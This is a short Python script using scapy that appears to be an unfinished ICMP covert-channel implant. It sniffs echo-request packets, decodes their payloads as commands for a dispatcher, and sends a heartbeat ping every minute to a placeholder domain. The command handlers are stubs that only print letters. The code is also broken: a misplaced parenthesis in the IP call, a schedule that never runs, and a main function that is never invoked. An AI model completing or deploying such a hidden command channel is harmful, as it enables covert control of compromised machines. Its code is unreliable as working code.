import schedule
import time
import threading
from scapy.all import *
cmn_cmds = []
def cmd_mon(pkt):
    if str(pkt.getlayer(ICMP).type) == "8":
        print(pkt.show())
        print(pkt.getlayer(ICMP).type)
        instruct = pkt.getlayer(ICMP).load.decode()
        cmd_proc(instruct)

def cmd_proc(cmd):
    if(cmd[0] == "a"):
        if(cmd[1] == "c"):
            print("A")
        elif (cmd[1] == "p"):
            print("A")
        elif (cmd[1] == "l"):
            print("A")
    elif(cmd[0] == "e"):
        if(cmd[1] == "c"):
            print("e")
        elif (cmd[1] == "p"):
            print("e")
        elif (cmd[1] == "l"):
            print("e")

def hbeat():
    schedule.every(1).minutes.do(sender)
def sender():
    sr1(IP(dst="insert domain here" / ICMP() /"h"))
def sniffer():
    sniff(filter="icmp", prn=cmd_mon)

def main():
    t1 = threading.Thread(target=hbeat)
    t2 = threading.Thread(target=sniffer)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
